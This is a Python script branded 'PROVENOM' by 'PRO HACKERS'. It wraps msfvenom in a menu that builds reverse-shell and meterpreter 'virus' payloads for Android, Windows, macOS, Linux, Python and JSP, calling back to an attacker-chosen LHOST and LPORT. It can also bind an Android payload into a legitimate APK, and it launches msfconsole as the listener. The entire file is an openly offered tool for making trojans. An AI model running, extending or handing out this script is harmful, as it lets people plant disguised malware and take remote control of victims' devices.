import subprocess
import time
import colorama
from colorama import Fore

print ("")
print ("")

subprocess.call("figlet " + "PRO HACKERS" + " | lolcat", shell=True )

time.sleep(3)

subprocess.call("clear", shell=True)

print(Fore.GREEN + "Coded By:- Abdul Fasith")

subprocess.call("figlet " + "PROVENOM" + " | lolcat", shell=True)

print(Fore.BLUE + "-*-*-*-*-*-*-*-*-*- PRO HACKERS -*-*-*-*-*-*-*-*-*-")
print(Fore.GREEN + "☆ Github==> https://github.com/Prohackers535")

print("")
print("")

print(Fore.RED + "👇👇 Select An Option From Below 👇👇")

print("")
print("")

print(Fore.YELLOW + "[" + Fore.GREEN + "1" + Fore.YELLOW + "]" + Fore.BLUE + " Android Payload")

print("")

print(Fore.YELLOW + "[" + Fore.GREEN + "2" + Fore.YELLOW + "]" + Fore.BLUE + " Windows Payload")

print("")

print(Fore.YELLOW + "[" + Fore.GREEN + "3" + Fore.YELLOW + "]" + Fore.BLUE + " Mac Payload")

print("")

print(Fore.YELLOW + "[" + Fore.GREEN + "4" + Fore.YELLOW + "]" + Fore.BLUE + " Linux Payload")

print("")

print(Fore.YELLOW + "[" + Fore.GREEN + "5" + Fore.YELLOW + "]" + Fore.BLUE + " Python Payload")

print("")

print(Fore.YELLOW + "[" + Fore.GREEN + "6" + Fore.YELLOW + "]" + Fore.BLUE + " Jsp Payload")

print("")

print(Fore.YELLOW + "[" + Fore.GREEN + "7" + Fore.YELLOW + "]" + Fore.BLUE + " OTHERS")

print("")

option = input(Fore.GREEN + "Select An Option:---->> ")

print("")

while option == "":
    print("")
    print(Fore.RED + "☆| PLEASE SELECT AN OPTION |☆") 
    print("")
    option = input(Fore.GREEN + "Select An Option:---->> ")


print("")

LHOST = input("Enter Your Ip Address Or Any LHOST:---->> ")

print("")

while LHOST == "":
    print("")
    print(Fore.RED + "☆| PLEASE ENTER A LHOST |☆")
    print("")
    LHOST = input(Fore.GREEN + "Enter Your Ip Address Or Any LHOST:---->> ")
    
print("")

LPORT = input("Enter Your LPORT [Ex- 4444]:---->> ")

print("")

while LPORT == "":
    print("")
    print(Fore.RED + "☆| PLEASE ENTER A LPORT |☆")
    print("")
    LPORT = input(Fore.GREEN + "Enter Your LPORT [Ex- 4444]:---->> ")
    print("")


if option == "1":
    print("")
    
    virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.apk OR $HOME/virus.apk]:---->> ")
    print("")
    
    while virus == "":
        
        print("")
        print(Fore.RED + "☆| PLEASE ENTER A NAME TO YOUR VIRUS |☆")
        print("")
        virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.apk OR $HOME/virus.apk]:---->> ")
        print("")
    
    apkmod = input("Do You Want To Bind Payload In To An Original apk [Type (y) to Yes]:--->> ")
    print("")
    
    if apkmod == "y":
        o_apk = input("Enter Your Original apk Path and Name:--->> ")
        print("")
        
        payload = "android/meterpreter/reverse_tcp"
        
        subprocess.call("apkmod -a -b -i " + o_apk + " -o " + virus + "" + "LHOST=" + LHOST + "" + "LPORT=" + LPORT , shell=True)
        print("")
        
    else:
        print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×") 
    
        print(Fore.BLUE + "Generating Payload android/meterpreter/reverse_tcp With LHOST " + LHOST + " LPORT " + LPORT)
    
        print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
    
        print("")
        subprocess.call("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
    
else:
    if option == "2":
        print("")
        virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.exe OR $HOME/virus.exe]:---->> ")
        
        print("")
        
        while virus == "":
            
             print(Fore.RED + "☆| PLEASE ENTER A NAME TO YOUR VIRUS |☆")
             print("")
             virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.exe OR $HOME/virus.exe]:---->> ")
             print("")
             
        print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×") 
    
        print(Fore.BLUE + "Generating Payload windows/meterpreter/reverse_tcp With LHOST " + LHOST + " LPORT " + LPORT)
    
        print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
        
        print("")
        subprocess.call("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
    else:
        if option == "3":
            print ("")
            virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.macho OR $HOME/virus.macho]:---->> ")
            print("")
        
            while virus == "":
                
            
                 print(Fore.RED + "☆| PLEASE ENTER A NAME TO YOUR VIRUS |☆")
                 print("")
                 virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.macho OR $HOME/virus.macho]:---->> ")
                 print("")
             
            print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×") 
    
            print(Fore.BLUE + "Generating Payload osx/x86/shell_reverse_tcp With LHOST " + LHOST + " LPORT " + LPORT)
    
            print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
        
            print("")
            subprocess.call("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
        
        else:
            if option == "4":
                print ("")
                
                virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.elf OR $HOME/virus.elf]:---->> ")
                print("")
                
                while virus == "":
                    
                    print(Fore.RED + "☆| PLEASE ENTER A NAME TO YOUR VIRUS |☆")
                    print("")
                    virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.elf OR $HOME/virus.elf]:---->> ")
                    print("")
                
             
                print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×") 
    
                print(Fore.BLUE + "Generating Payload linux/x86/meterpreter/reverse_tcp With LHOST " + LHOST + " LPORT " + LPORT)
    
                print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
        
                print("")
                subprocess.call("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
            else:
                if option == "5":
                    print("")
                    
                    virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.py OR $HOME/virus.py]:---->> ")
                    print("")
                
                    while virus == "":
                        
                    
                        print(Fore.RED + "☆| PLEASE ENTER A NAME TO YOUR VIRUS |☆")
                        print("")
                        virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.py OR $HOME/virus.py]:---->> ")
                        print("")
                
             
                    print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×") 
    
                    print(Fore.BLUE + "Generating Payload python/meterpreter/reverse_tcp With LHOST " + LHOST + " LPORT " + LPORT)
    
                    print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
        
                    print("")
                    subprocess.call("msfvenom -p python/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
                    
                else:
                    if option == "6":
                        print("")
                        
                        virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.jsp OR $HOME/virus.jsp]:---->> ")
                        print("")
                
                        while virus == "":
                            
                        
                            print(Fore.RED + "☆| PLEASE ENTER A NAME TO YOUR VIRUS |☆")
                            print("")
                            virus = input("Enter Your Path And Virus Name [Ex- /sdcard/virus.jsp OR $HOME/virus.jsp]:---->> ")
                            print("")
                
             
                        print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×") 
    
                        print(Fore.BLUE + "Generating Payload java/jsp_shell_reverse_tcp With LHOST " + LHOST + " LPORT " + LPORT)
    
                        print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
        
                        print("")
                        subprocess.call("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
                        
                    else:
                        if option == "7":
                            print("")
                            
                            payload = input("Enter Your Payload:---->> ")
                            print("")
                            while payload == "":
                                
                                print("☆| Please Enter Your Payload |☆")
                                print("")
                                payload = input("Enter Your Payload:---->> ")
                                
                            virus = input("Enter Your Virus Name:---->> ")
                            print("")
                            while virus == "":
                                
                                print("☆| Please Enter Your Virus Name |☆")
                                print("")
                                virus = input("Enter Your Virus Name:---->> ")
                                print("")
                            
                        print("×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")

                        print("Generating Payload " + payload + " With LHOST " + LHOST + " , LPORT " + LPORT)
                        
                        
                        print("×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")



                        print("")



                        subprocess.call(["msfvenom", "-p", payload, "LHOST=" + LHOST, "LPORT=" + LPORT, "-o", virus])
                        

print("")                        
                        
print("-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-")
print("")
                        
                        
yes = (input(Fore.BLUE + "Do You Want Start Listner Type (y) to Yes Type (n) to No [y/n]:---->> "))
print("")

while yes == "":
    yes = (input(Fore.BLUE + "Do You Want Start Listner Type (y) to Yes Type (n) to No [y/n]:---->> "))
    print("")
    
if yes == "y":
    print("")
    print(Fore.YELLOW + "Copy and past Below Comments In msfconsole")
    print("")
    print(Fore.RED + "#####################################")
    print("")
    
    print(Fore.YELLOW + ">> set LPORT " + LPORT)
    print("")
    print(Fore.YELLOW + ">> set LHOST " + LHOST)
    print("")
    print(Fore.YELLOW + ">> set PAYLOAD " + payload)
    print("")
    print(Fore.RED + "#####################################")
    print("")
    
    subprocess.call("msfconsole" , shell=True)
    
    
print("")

print(Fore.BLUE + "|¡¡|¡¡|¡¡|¡¡|¡¡| Thank You For Using PROVENOM |¡¡|¡¡|¡¡|¡¡|¡¡|")
print("")

time.sleep(3)


subprocess.call("figlet " + "PRO HACKERS" + " | lolcat", shell=True )

time.sleep(3)

subprocess.call("clear", shell=True)

print(Fore.GREEN + "Coded By:- Abdul Fasith")

subprocess.call("figlet " + "PROVENOM" + " | lolcat", shell=True)
print("")

print(Fore.BLUE + "-*-*-*-*-*-*-*-*-*- PRO HACKERS -*-*-*-*-*-*-*-*-*-")
print(Fore.GREEN + "☆ Github==> https://github.com/Prohackers535")

print("")



                            
                            
                            
                            
                        
                        
                    
                    
                    
                    
                
        
        
        
    
            
        
